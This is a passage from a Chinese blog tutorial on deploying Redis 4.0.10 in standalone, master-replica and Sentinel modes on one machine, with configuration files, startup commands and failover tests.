class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这种启动方式非但无法在后台运行，而且也不符合使用习惯。<br>另外默认情况下Redis也不直接支持开机自启，为此要对其进行改造。</p><p>通过命令<code>vi /usr/local/redis-4.0.10/redis.conf</code>编辑Redis配置文件，为支持后台启动：</p><pre class="line-numbers language-bash"><code class="language-bash">daemonize <span class="token function">yes</span>　　　　　　<span class="token comment" spellcheck="true"># 后台启动模式</span><span class="token comment" spellcheck="true"># 顺便修改一下其他配置项</span>maxmemory 536870912　　<span class="token comment" spellcheck="true"># 最大内存（单位byte），需根据实际配置，建议为当前空闲内存的50%左右</span><span class="token function">dir</span> /tmp/redis　　　　　<span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），默认值为[./]，logfile与dbfilename受其影响</span>logfile <span class="token string">"6379.log"</span>　　　　<span class="token comment" spellcheck="true"># Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称</span>dbfilename dump.rdb　　<span class="token comment" spellcheck="true"># Redis数据持久化时的存储位置，正式部署请设置为合适的名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 单机模式配置redis.conf下载：<a href="https://share.weiyun.com/5ZhIKTe">https://share.weiyun.com/5ZhIKTe</a> 密码：nppwyt ●</p></blockquote><p>新建上面配置的Redis工作目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /tmp/redis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在/etc目录下新建redis目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /etc/redis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拷贝redis.conf配置文件到/etc/redis目录下，并<font color="red">重命名为6379.conf</font>（取的是Redis默认端口名称，Redis启动脚本里的变量会读取这个名称，因此若redis的端口号改了，这个文件名也要修改）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /usr/local/redis-4.0.10/redis.conf /etc/redis/6379.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拷贝Redis的启动脚本到/etc/init.d目录下，并<font color="red">重命名为redisd</font>：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /usr/local/redis-4.0.10/utils/redis_init_script /etc/init.d/redisd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过<code>vi /etc/init.d/redisd</code>命令修改redisd文件，在首行<code>#!/bin/sh</code>下面添加两行（其含义是Redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token comment" spellcheck="true"># chkconfig:   2345 90 10</span><span class="token comment" spellcheck="true"># description:  Redis is a persistent key-value database</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>切换到/etc/init.d目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/init.d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置为开机自启：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chkconfig</span> redisd on　　　<span class="token comment" spellcheck="true"># 若不需要自启则执行 chkconfig redisd off</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在可以直接以服务的形式启动Redis了：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> redisd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-4-测试"><a href="#4-4-测试" class="headerlink" title="4.4. 测试"></a>4.4. 测试</h3><p>然后通过Redis测试客户端命令<code>redis-cli</code>连接到Redis实例：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-4.0.10/src/         <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -h 127.0.0.1 -p 6379        <span class="token comment" spellcheck="true"># 连接到Redis</span>172.168.10.63:6379<span class="token operator">></span> info                <span class="token comment" spellcheck="true"># 查看Redis信息</span><span class="token comment" spellcheck="true"># Server</span>redis_version:4.0.10redis_git_sha1:00000000redis_git_dirty:0redis_build_id:a5e228e715215d35redis_mode:standaloneos:Linux 2.6.32-358.el6.x86_64 x86_64arch_bits:64multiplexing_api:epollatomicvar_api:sync-builtingcc_version:4.4.7process_id:26027run_id:d5f3dd33bb6b52f9b82927992251e21b3a68432etcp_port:6379uptime_in_seconds:1806685uptime_in_days:20hz:10lru_clock:9988483executable:/usr/local/bin/redis-serverconfig_file:/etc/redis/6379.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font color="red">至此Redis单机模式部署完成。</font></p><p>为了开始下一阶段部署，现在先停止这个Redis进程：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> redisd stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-主从模式"><a href="#5-主从模式" class="headerlink" title="5. 主从模式"></a>5. 主从模式</h2><h3 id="5-1-简介"><a href="#5-1-简介" class="headerlink" title="5.1. 简介"></a>5.1. 简介</h3><p>在实际生产环境下，Redis基本上是不可能部署成单机模式的。一般都需要部署Redis集群实现高可用，以保障业务的稳定运行。</p><p>要学会部署Redis集群，那就先从Redis集群中最简单的<strong>主从模式</strong>说起。</p><p>在一些简单小型的应用中，我们可能会看到类似于下图的Redis部署架构。其中Master是主机，Slave是从机，而这种架构方式就是所谓的<strong>一主多从</strong>：</p><p><img src="./01.png"></p><p>在这种架构模式下，主机和从机的数据完全一致，主机支持数据的写入和读取等各项操作，而从机则只支持与主机数据的同步和读取。也就是说，客户端可以将数据写入到主机，由主机自动将数据的写入操作同步到从机。</p><p><strong>主从模式很好的解决了数据备份问题</strong>，并且由于主从服务数据几乎是一致的，因而可以将写入数据的命令发送给主机执行，而读取数据的命令发送给不同的从机执行，从而达到读写分离的目的。</p><h3 id="5-2-部署"><a href="#5-2-部署" class="headerlink" title="5.2. 部署"></a>5.2. 部署</h3><p>下面演示如何部署一个一主三从的<strong>主从模式</strong>。</p><p>为了区分单机模式的部署位置，这里拷贝一下Redis的目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> -r /usr/local/redis-4.0.10 /usr/local/redis-ms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下文会基于<code>于/usr/local/redis-ms</code>目录部署主从模式。</p><p>由于每个Redis实例都是一个单独的进程，所以需要在每个Redis实例启动时为其分配一个独立的配置文件就能使他们区分开来（同时由于本文是部署在同一台机器，需为每个实例指定不同的服务端口）。</p><p>为了在同一台机器上部署一主三从的Redis，准备以下四份配置文件：</p><table><thead><tr><th align="center">角色</th><th align="center">配置文件</th><th align="center">服务端口</th></tr></thead><tbody><tr><td align="center">主机</td><td align="center">redis-6379.conf</td><td align="center">6379</td></tr><tr><td align="center">从机</td><td align="center">redis-6380.conf</td><td align="center">6380</td></tr><tr><td align="center">从机</td><td align="center">redis-6381.conf</td><td align="center">6381</td></tr><tr><td align="center">从机</td><td align="center">redis-6382.conf</td><td align="center">6382</td></tr></tbody></table><blockquote><p>这四份配置文件均拷贝自 <code>/usr/local/redis-ms/redis.conf</code> ，拷贝到 <code>/usr/local/redis-ms/</code> 目录再修改即可。</p></blockquote><p>主机redis-<font color="red">6379</font>.conf配置文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1            <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 6379daemonize <span class="token function">yes</span>pidfile /var/run/redis_6379.pid<span class="token function">dir</span> /tmp/redis-ms         <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响</span>logfile <span class="token string">"6379.log"</span>        <span class="token comment" spellcheck="true"># Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称</span>dbfilename dump-6379.rdb  <span class="token comment" spellcheck="true"># Redis数据持久化时的存储位置，正式部署请设置为合适的名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 主从模式配置redis-6379.conf下载：<a href="https://share.weiyun.com/5JOX4Nd">https://share.weiyun.com/5JOX4Nd</a> 密码：qdcfie ●</p></blockquote><p>从机redis-<font color="blue">6380</font>.conf配置文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1            <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 6380daemonize <span class="token function">yes</span>pidfile /var/run/redis_6380.pid<span class="token function">dir</span> /tmp/redis-ms         <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响</span>logfile <span class="token string">"6380.log"</span>        <span class="token comment" spellcheck="true"># Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称</span>dbfilename dump-6380.rdb  <span class="token comment" spellcheck="true"># Redis数据持久化时的存储位置，正式部署请设置为合适的名称</span>slaveof 127.0.0.1 6379    <span class="token comment" spellcheck="true"># 标注所从属的主机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 主从模式配置redis-6380.conf下载：<a href="https://share.weiyun.com/5SCapFt">https://share.weiyun.com/5SCapFt</a> 密码：4sibg2 ●</p></blockquote><p>从机redis-<font color="blue">6381</font>.conf配置文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1            <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 6381daemonize <span class="token function">yes</span>pidfile /var/run/redis_6381.pid<span class="token function">dir</span> /tmp/redis-ms         <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响</span>logfile <span class="token string">"6381.log"</span>        <span class="token comment" spellcheck="true"># Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称</span>dbfilename dump-6381.rdb  <span class="token comment" spellcheck="true"># Redis数据持久化时的存储位置，正式部署请设置为合适的名称</span>slaveof 127.0.0.1 6379    <span class="token comment" spellcheck="true"># 标注所从属的主机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 主从模式配置redis-6381.conf下载：<a href="https://share.weiyun.com/5pZ7hup">https://share.weiyun.com/5pZ7hup</a> 密码：jiw8gm ●</p></blockquote><p>从机redis-<font color="blue">6382</font>.conf配置文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1            <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 6382daemonize <span class="token function">yes</span>pidfile /var/run/redis_6382.pid<span class="token function">dir</span> /tmp/redis-ms         <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响</span>logfile <span class="token string">"6382.log"</span>        <span class="token comment" spellcheck="true"># Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称</span>dbfilename dump-6382.rdb  <span class="token comment" spellcheck="true"># Redis数据持久化时的存储位置，正式部署请设置为合适的名称</span>slaveof 127.0.0.1 6379    <span class="token comment" spellcheck="true"># 标注所从属的主机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 主从模式配置redis-6382.conf下载：<a href="https://share.weiyun.com/5rlib8O">https://share.weiyun.com/5rlib8O</a> 密码：xf6qkn ●</p></blockquote><p>新建上面配置的Redis工作目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /tmp/redis-ms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用redis-server命令启动Redis主从实例：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-ms/src/           <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis-6379.conf     <span class="token comment" spellcheck="true"># 启动Redis主机，必须先启动</span>./redis-server <span class="token punctuation">..</span>/redis-6380.conf     <span class="token comment" spellcheck="true"># 启动Redis从机</span>./redis-server <span class="token punctuation">..</span>/redis-6381.conf     <span class="token comment" spellcheck="true"># 启动Redis从机</span>./redis-server <span class="token punctuation">..</span>/redis-6382.conf     <span class="token comment" spellcheck="true"># 启动Redis从机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-3-测试"><a href="#5-3-测试" class="headerlink" title="5.3. 测试"></a>5.3. 测试</h3><p>现在测试Redis主从模式是否能正常工作。</p><p>可先通过<code>ps -ef|grep redis</code>命令可查看四个主从进程是否正常启动：</p><blockquote><p>root       3919      1  0 22:08 ?        00:00:02 ./redis-server 127.0.0.1:6379<br>root       3924      1  0 22:08 ?        00:00:02 ./redis-server 127.0.0.1:6380<br>root       3930      1  0 22:08 ?        00:00:02 ./redis-server 127.0.0.1:6381<br>root       3936      1  0 22:08 ?        00:00:02 ./redis-server 127.0.0.1:6382</p></blockquote><p>然后通过Redis测试客户端命令<code>redis-cli</code>分别连接到四台机器：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-ms/src/          <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -h 127.0.0.1 -p 6379     <span class="token comment" spellcheck="true"># 连接到Redis主机</span>./redis-cli -h 127.0.0.1 -p 6380     <span class="token comment" spellcheck="true"># 连接到Redis从机</span>./redis-cli -h 127.0.0.1 -p 6381     <span class="token comment" spellcheck="true"># 连接到Redis从机</span>./redis-cli -h 127.0.0.1 -p 6382     <span class="token comment" spellcheck="true"># 连接到Redis从机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分别在四个Redis测试客户端执行get命令，获取键名为site的数据：</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6379<span class="token operator">></span> get site<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true"># 由于是新部署的Redis集群，该键值必定不存在</span>127.0.0.1:6380<span class="token operator">></span> get site<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true"># 由于是新部署的Redis集群，该键值必定不存在</span>127.0.0.1:6381<span class="token operator">></span> get site<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true"># 由于是新部署的Redis集群，该键值必定不存在</span>127.0.0.1:6382<span class="token operator">></span> get site<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true"># 由于是新部署的Redis集群，该键值必定不存在</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在在Redis<font color="red">主机6379</font>的客户端<strong>写入数据</strong>（执行set命令，为键site设置数据）：</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6379<span class="token operator">></span> <span class="token keyword">set</span> site http://exp-blog.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再在三台Redis<font color="blue">从机 6380 ~ 6382 </font>的客户端<strong>读取数据</strong>（执行get命令，获取键名为site的数据）。由于经过主从数据同步，此时三台从机都能取到值：</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6380<span class="token operator">></span> get site<span class="token string">"http://exp-blog.com"</span>127.0.0.1:6381<span class="token operator">></span> get site<span class="token string">"http://exp-blog.com"</span>127.0.0.1:6382<span class="token operator">></span> get site<span class="token string">"http://exp-blog.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font color="red">至此Redis主从模式部署完成。</font></p><p>下一阶段哨兵模式的部署是基于主从模式的，可以暂且不用停止Redis进程。</p><h2 id="6-哨兵模式"><a href="#6-哨兵模式" class="headerlink" title="6. 哨兵模式"></a>6. 哨兵模式</h2><h3 id="6-1-简介"><a href="#6-1-简介" class="headerlink" title="6.1. 简介"></a>6.1. 简介</h3><p>前面所配置的主从模式，虽然实现了读写分离，解决了数据备份问题和单机模式可能存在的性能问题，但是也引入了新的问题：</p><p>由于主从模式下可以将读写操作分配给不同的Redis节点，从而达到提高系统吞吐量的目的，但也正是因为这种方式造成了使用上的不便。因为客户端连接到不同的Redis节点时，都需要指定特定的IP端口，若所连接的节点因为故障下线了，主从模式便无法通知客户端切换到另一个可用节点，只能靠手动更改客户端配置并重连。</p><p>尤其是如果故障下线的是主节点，那么所有的从节点便会因为没有主节点而同步中断，整个集群会陷入瘫痪（严格来说是所有从节点变成独立节点，再无关联性），直至人工重新指定新的主节点。</p><p>为了解决上面的问题，Redis在<strong>2.8版本后</strong>开始支持<strong>哨兵模式</strong>，其架构模式如下图：</p><p><img src="./02.png"></p><p>Redis的Sentinel系统（即哨兵系统）可用于管理多组Redis主从实例，它是Redis的高可用性解决方案。这个系统主要执行以下三个任务：</p><ul><li>监控（Monitoring）：Sentinel会不断地定期检查主/从节点服务器是否运作正常</li><li>提醒（Notification）：当被监控的某个节点服务器出现问题时，Sentinel可以通过API向管理员或者其他应用程序发送通知</li><li>自动故障迁移（Automaticfailover）：当一个主节点不能正常工作时，Sentinel会开始一次自动故障迁移操作，它会将失效主节点下的其中一个从节点升级为新的主节点，并让失效主主节点的其他从节点改为复制新的主节点。当Redis客户端试图连接失效的主节点时，集群也会向客户端返回新主节点的地址，使得集群可以使用新主节点代替失效主节点。</li></ul><h3 id="6-2-部署"><a href="#6-2-部署" class="headerlink" title="6.2. 部署"></a>6.2. 部署</h3><p>下面演示如何在上一阶段的主从模式基础上，增加部署一套<strong>哨兵系统</strong>。</p><p>先准备好三份配置文件：</p><table><thead><tr><th align="center">角色</th><th align="center">配置文件</th><th align="center">监听端口</th></tr></thead><tbody><tr><td align="center">哨兵</td><td align="center">sentinel-26380.conf</td><td align="center">26380</td></tr><tr><td align="center">哨兵</td><td align="center">sentinel-26381.conf</td><td align="center">26381</td></tr><tr><td align="center">哨兵</td><td align="center">sentinel-26382.conf</td><td align="center">26382</td></tr></tbody></table><blockquote><p>① 这三份配置文件均拷贝自<code>/usr/local/redis-ms/sentinel.conf </code>，拷贝到 <code>/usr/local/redis-ms/ </code>目录再修改即可。<br>② 建议哨兵至少部署3个，并且哨兵节点数量要满足2n+1（n&gt;=1），即奇数个。</p></blockquote><p>哨兵sentinel-<font color="blue">26380</font>.conf配置文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1                   <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 26380daemonize <span class="token function">yes</span>                    <span class="token comment" spellcheck="true"># 后台启动模式（若无配置项则添加）</span><span class="token function">dir</span> /tmp/redis-ms                <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile受其影响</span>logfile <span class="token string">"sentinel-26380.log"</span>     <span class="token comment" spellcheck="true"># 哨兵日志名称（若无配置项则添加），正式部署请设置为合适的名称</span>sentinel monitor exp-blog.com 127.0.0.1 6379 2    <span class="token comment" spellcheck="true"># 标注所监视的主机（其下的从机会被自动拉取，无需配置）</span>sentinel down-after-milliseconds exp-blog.com 30000sentinel parallel-syncs exp-blog.com 1sentinel failover-timeout exp-blog.com 180000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 哨兵模式配置sentinel-26380.conf下载：<a href="https://share.weiyun.com/52UsmNu">https://share.weiyun.com/52UsmNu</a> 密码：fyrtmn ●</p></blockquote><p>哨兵sentinel-<font color="blue">26381</font>.conf配置文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1                   <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 26381daemonize <span class="token function">yes</span>                    <span class="token comment" spellcheck="true"># 后台启动模式（若无配置项则添加）</span><span class="token function">dir</span> /tmp/redis-ms                <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile受其影响</span>logfile <span class="token string">"sentinel-26381.log"</span>     <span class="token comment" spellcheck="true"># 哨兵日志名称（若无配置项则添加），正式部署请设置为合适的名称</span>sentinel monitor exp-blog.com 127.0.0.1 6379 2    <span class="token comment" spellcheck="true"># 标注所监视的主机（其下的从机会被自动拉取，无需配置）</span>sentinel down-after-milliseconds exp-blog.com 30000sentinel parallel-syncs exp-blog.com 1sentinel failover-timeout exp-blog.com 180000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 哨兵模式配置sentinel-26381.conf下载：<a href="https://share.weiyun.com/5muO7vd">https://share.weiyun.com/5muO7vd</a> 密码：8i72bw ●</p></blockquote><p>哨兵sentinel-<font color="blue">26382</font>.conf配置文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1                   <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 26382daemonize <span class="token function">yes</span>                    <span class="token comment" spellcheck="true"># 后台启动模式（若无配置项则添加）</span><span class="token function">dir</span> /tmp/redis-ms                <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile受其影响</span>logfile <span class="token string">"sentinel-26382.log"</span>     <span class="token comment" spellcheck="true"># 哨兵日志名称（若无配置项则添加），正式部署请设置为合适的名称</span>sentinel monitor exp-blog.com 127.0.0.1 6379 2    <span class="token comment" spellcheck="true"># 标注所监视的主机（其下的从机会被自动拉取，无需配置）</span>sentinel down-after-milliseconds exp-blog.com 30000sentinel parallel-syncs exp-blog.com 1sentinel failover-timeout exp-blog.com 180000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 哨兵模式配置sentinel-26382.conf下载：<a href="https://share.weiyun.com/5g6NMkM">https://share.weiyun.com/5g6NMkM</a> 密码：db6ugw ●</p></blockquote><p>针对上面几个sentinel-xxxxx.conf配置中的几个关键配置项说明如下：</p><ul><li><code>sentinel monitor exp-blog.com 127.0.0.1 6379 2</code><br>　　监控的主节点的名字为exp-blog.com（这个名字任意的，有效字符为[A-Z] [a-z] [0-9] [._-]）<br>　　监控的主节点服务地址127.0.0.1:6379<br>　　行尾最后的2表示当集群中有2个以上sentinel认为主节点下线时，才认为其客观下线</li><li><code>sentinel down-after-milliseconds exp-blog.com 30000</code><br>　　主节点在30000 ms内无反应，哨兵会开始使用“选举机制”进行主从切换</li><li><code>sentinel parallel-syncs exp-blog.com 1</code><br>　　在因主节点失效而发生故障转移（即主从切换）时，最多可以有多少个从节点同时对新的主节点进行并发同步。<br>　　这个数字越小，完成故障转移所需的时间就越长（余下的从节点需要排队等待同步）；<br>　　但这个数字越大，就意味着越多的从节点因为正在对新的主节点进行同步而不可用。<br>　　当从节点只用于查询服务时，可将此值设为1确保最多只有一个从节点因同步而不可用。</li><li><code>sentinel failover-timeout exp-blog.com 180000</code><br>　　如果在该180000 ms内未能完成故障转移，则认这次故障转移超时失败。<br>　　不过即使超时，从节点也会正确指向新主节点，但不会按照parallel-syncs规则进行同步</li></ul><p>接下来就可以启动Redis主从服务和Sentinel系统了。</p><p>启动顺序必须严格按照：</p><blockquote><p>Redis Master（主节点） -&gt; Redis Slave（从节点） -&gt; Redis Sentinel（哨兵节点）</p></blockquote><p>主从服务的启动在上一阶段已经做过了，此处就不重述了。</p><p>Sentinel系统需要使用redis-sentinel命令启动：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-ms/src/                <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-sentinel <span class="token punctuation">..</span>/sentinel-26380.conf    <span class="token comment" spellcheck="true"># 启动Redis哨兵节点</span>./redis-sentinel <span class="token punctuation">..</span>/sentinel-26381.conf    <span class="token comment" spellcheck="true"># 启动Redis哨兵节点</span>./redis-sentinel <span class="token punctuation">..</span>/sentinel-26382.conf    <span class="token comment" spellcheck="true"># 启动Redis哨兵节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-3-测试"><a href="#6-3-测试" class="headerlink" title="6.3. 测试"></a>6.3. 测试</h3><p>现在测试Sentinel系统是否能正常工作。</p><p>可先通过<code>ps -ef|grep redis</code>命令可查看四个主从进程和三个监控进程是否正常启动：</p><blockquote><p>root       3919      1  0 22:08 ?        00:00:02 ./redis-server 127.0.0.1:6379<br>root       3924      1  0 22:08 ?        00:00:02 ./redis-server 127.0.0.1:6380<br>root       3930      1  0 22:08 ?        00:00:02 ./redis-server 127.0.0.1:6381<br>root       3936      1  0 22:08 ?        00:00:02 ./redis-server 127.0.0.1:6382<br><font color="red">root       4342      1  0 22:37 ?        00:00:00 ./redis-sentinel 127.0.0.1:26380 [sentinel]<br>root       4347      1  0 22:37 ?        00:00:00 ./redis-sentinel 127.0.0.1:26381 [sentinel]<br>root       4383      1  0 22:38 ?        00:00:00 ./redis-sentinel 127.0.0.1:26382 [sentinel]</font></p></blockquote><p>然后通过Redis测试客户端命令<code>redis-cli</code>连接到任意一台Sentinel机器查看监控信息（实际生产环境中，一般是不需要连接Sentinel机器的）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-ms/src/             <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -h 127.0.0.1 -p 26380        <span class="token comment" spellcheck="true"># 连接到哨兵机26380</span>127.0.0.1:26380<span class="token operator">></span> info sentinel           <span class="token comment" spellcheck="true"># 查看监控信息</span>./redis-cli -h 127.0.0.1 -p 26381        <span class="token comment" spellcheck="true"># 连接到哨兵机26381</span>127.0.0.1:26381<span class="token operator">></span> info sentinel           <span class="token comment" spellcheck="true"># 查看监控信息</span>./redis-cli -h 127.0.0.1 -p 26382        <span class="token comment" spellcheck="true"># 连接到哨兵机26382</span>127.0.0.1:26382<span class="token operator">></span> info sentinel           <span class="token comment" spellcheck="true"># 查看监控信息</span><span class="token comment" spellcheck="true"># 三台哨兵的返回信息是一致的：</span>sentinel_masters:1     <span class="token comment" spellcheck="true"># 监控主机1台</span>sentinel_tilt:0sentinel_running_scripts:0sentinel_scripts_queue_length:0sentinel_simulate_failure_flags:0<span class="token comment" spellcheck="true"># 0号主机名称为exp-blog.com，地址为127.0.0.1:6379，共有三台从机，三台哨兵机</span>master0:name<span class="token operator">=</span>exp-blog.com,status<span class="token operator">=</span>ok,address<span class="token operator">=</span>127.0.0.1:6379,slaves<span class="token operator">=</span>3,sentinels<span class="token operator">=</span>3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在尝试终止Redis主机进程（6379端口节点）来模拟主机下线：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-ms/src/             <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -h 127.0.0.1 -p 6379        <span class="token comment" spellcheck="true"># 连接到Redis主机</span>127.0.0.1:6379<span class="token operator">></span> <span class="token function">shutdown</span>                <span class="token comment" spellcheck="true"># 终止Redis服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后连接到任意一台哨兵机，查看当前的监控信息：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-ms/src/             <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -h 127.0.0.1 -p 26380       <span class="token comment" spellcheck="true"># 连接到哨兵机26380</span>127.0.0.1:26380<span class="token operator">></span> info sentinel          <span class="token comment" spellcheck="true"># 查看监控信息</span><span class="token comment" spellcheck="true"># 返回监控信息</span>sentinel_masters:1sentinel_tilt:0sentinel_running_scripts:0sentinel_scripts_queue_length:0sentinel_simulate_failure_flags:0master0:name<span class="token operator">=</span>exp-blog.com,status<span class="token operator">=</span>ok,address<span class="token operator">=</span>127.0.0.1:6382,slaves<span class="token operator">=</span>3,sentinels<span class="token operator">=</span>3  <span class="token comment" spellcheck="true"># 主机地址发生变化了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不难发现主机变成了<code>127.0.0.1:6382</code>，登陆这台主机查看主从信息：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-ms/src/             <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -h 127.0.0.1 -p 6382        <span class="token comment" spellcheck="true"># 连接到Redis主机</span>127.0.0.1:6382<span class="token operator">></span> info replication        <span class="token comment" spellcheck="true"># 查看主从信息</span><span class="token comment" spellcheck="true"># 返回主从信息</span>role:masterconnected_slaves:2      <span class="token comment" spellcheck="true"># 这台主机下有2台从机</span>slave0:ip<span class="token operator">=</span>127.0.0.1,port<span class="token operator">=</span>6381,state<span class="token operator">=</span>online,offset<span class="token operator">=</span>254791,lag<span class="token operator">=</span>1  <span class="token comment" spellcheck="true"># 0号从机是 127.0.0.1:6381</span>slave1:ip<span class="token 